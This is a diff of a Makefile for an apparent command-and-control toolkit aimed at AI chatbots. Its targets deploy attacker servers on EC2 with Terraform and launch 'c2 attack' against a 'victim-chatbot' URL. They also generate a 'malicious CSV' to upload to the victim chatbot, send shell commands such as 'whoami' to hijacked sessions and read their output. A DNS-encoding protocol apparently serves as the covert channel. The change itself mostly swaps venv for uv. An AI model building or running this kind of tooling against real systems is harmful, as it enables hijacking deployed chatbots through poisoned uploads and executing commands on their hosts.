@@ -18,18 +18,17 @@ endif
 # Setup
 # =============================================================================
 
-setup: venv
-	./venv/bin/pip install -e .
+setup:
+	uv sync --all-extras
 	@echo ""
-	@echo "Setup complete! Activate with: source venv/bin/activate"
-	@echo "Then run: c2 --help"
+	@echo "Setup complete! Run commands with: uv run c2 --help"
 
-venv:
-	python3 -m venv venv
-	./venv/bin/pip install --upgrade pip
-
-# Generate .env from Terraform outputs
-.env: terraform/.terraform
+# Generate .env from Terraform outputs (run after terraform-apply)
+env-from-terraform:
+	@if [ ! -d "terraform/.terraform" ]; then \
+		echo "Error: Run 'make terraform-init' first"; \
+		exit 1; \
+	fi
 	@echo "# Generated from Terraform outputs" > .env
 	@echo "EC2_IP=$$(cd terraform && terraform output -raw instance_public_ip)" >> .env
 	@echo "EC2_INSTANCE_ID=$$(cd terraform && terraform output -raw instance_id)" >> .env
@@ -56,13 +55,13 @@ terraform-destroy:
 # Full deploy: init + plan + apply (auto-approve) + configure
 deploy: terraform-init
 	cd terraform && terraform plan && terraform apply -auto-approve
-	$(MAKE) .env
+	$(MAKE) env-from-terraform
 	$(MAKE) configure-ec2
 	@echo ""
 	@echo "C2 Infrastructure deployed!"
 	@echo ""
 	@echo "Environment configured in .env"
-	@echo "Run: source venv/bin/activate && c2 --help"
+	@echo "Run: uv run c2 --help"
 
 # Legacy alias
 terraform-yolo: deploy
@@ -81,11 +80,11 @@ attack:
 		echo "Usage: make attack TARGET=https://victim-chatbot.com"; \
 		exit 1; \
 	fi
-	./venv/bin/c2 attack $(TARGET)
+	uv run c2 attack $(TARGET)
 
 # Generate malicious CSV
 generate-csv:
-	./venv/bin/c2 generate-csv
+	uv run c2 generate-csv
 
 # Send command to session
 # Usage: make send CMD="whoami" SESSION=sess_abc123
@@ -94,7 +93,7 @@ send:
 		echo "Usage: make send CMD=\"whoami\" SESSION=sess_abc123"; \
 		exit 1; \
 	fi
-	./venv/bin/c2 send "$(CMD)" -s $(SESSION)
+	uv run c2 send "$(CMD)" -s $(SESSION)
 
 # Receive output from session
 # Usage: make receive SESSION=sess_abc123
@@ -103,30 +102,33 @@ receive:
 		echo "Usage: make receive SESSION=sess_abc123"; \
 		exit 1; \
 	fi
-	./venv/bin/c2 receive -s $(SESSION)
+	uv run c2 receive -s $(SESSION)
 
 # Attach to session interactively
-# Usage: make attach SESSION=sess_abc123
+# Usage: make attach (reads from .session_id) or make attach SESSION=sess_abc123
 attach:
-	@if [ -z "$(SESSION)" ]; then \
+	@if [ -z "$(SESSION)" ] && [ -f .session_id ]; then \
+		SESSION_ID=$$(cat .session_id); \
+		echo "Using session ID from .session_id: $$SESSION_ID"; \
+		uv run c2 attach $$SESSION_ID; \
+	elif [ -n "$(SESSION)" ]; then \
+		uv run c2 attach $(SESSION); \
+	else \
 		echo ""; \
-		echo "Usage: make attach SESSION=sess_abc123"; \
+		echo "No session ID found."; \
 		echo ""; \
-		echo "To get a session ID:"; \
-		echo "  1. Run: make generate-csv"; \
-		echo "  2. Upload the CSV to the victim chatbot"; \
-		echo "  3. Use the session ID shown in generate-csv output"; \
+		echo "Run 'make generate-csv' first, or specify manually:"; \
+		echo "  make attach SESSION=sess_abc123"; \
 		echo ""; \
 		exit 1; \
 	fi
-	./venv/bin/c2 attach $(SESSION)
 
 # Alias for backwards compatibility
 operator: attach
 
 # Check C2 server status
 status:
-	./venv/bin/c2 status
+	uv run c2 status
 
 # =============================================================================
 # C2 Server Management
@@ -153,20 +155,32 @@ update-dns:
 # =============================================================================
 
 test:
-	python3 -m pytest tests/ -v
+	uv run pytest tests/ -v
+
+# Verify DNS protocol implementations match between c2/core/dns_protocol.py and terraform/c2-server/dns_server_with_api.py
+verify-protocol:
+	@uv run python -c "from c2.core.dns_protocol import encode_chunk_to_ip; \
+	import sys; sys.path.insert(0, 'terraform/c2-server'); \
+	from dns_server_with_api import encode_chunk_to_ip as server_encode; \
+	test_cases = [('abc', False), ('xy', True), ('z', True)]; \
+	results = [(encode_chunk_to_ip(*t), server_encode(*t)) for t in test_cases]; \
+	assert all(a==b for a,b in results), 'Protocol mismatch!'; \
+	print('✓ Protocol implementations verified')"
 
 # =============================================================================
 # Cleanup
 # =============================================================================
 
 clean:
-	rm -rf venv/
+	rm -rf .venv/
 	rm -rf *.egg-info/
 	rm -rf .eggs/
 	rm -rf build/
 	rm -rf dist/
 	find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
 	rm -f .env
+	rm -f .session_id
+	rm -f malicious_data.csv
 
 destroy: terraform-destroy clean
 
@@ -180,7 +194,7 @@ help:
 	@echo "==============================="
 	@echo ""
 	@echo "Setup:"
-	@echo "  make setup              Create venv and install c2 CLI"
+	@echo "  make setup              Install dependencies with uv"
 	@echo "  make deploy             Deploy C2 infrastructure"
 	@echo ""
 	@echo "Attack Workflow:"
@@ -199,9 +213,10 @@ help:
 	@echo "  make update-dns         Redeploy DNS server code"
 	@echo ""
 	@echo "Or use the CLI directly:"
-	@echo "  c2 --help               Show all CLI commands"
+	@echo "  uv run c2 --help        Show all CLI commands"
 	@echo ""
 
-.PHONY: setup venv terraform-init terraform-plan terraform-apply terraform-destroy \
+.PHONY: setup terraform-init terraform-plan terraform-apply terraform-destroy \
         deploy terraform-yolo configure-ec2 attack generate-csv send receive attach \
-        operator status logs check-dns update-dns test clean destroy help
+        operator status logs check-dns update-dns test verify-protocol clean destroy help \
+        env-from-terraform
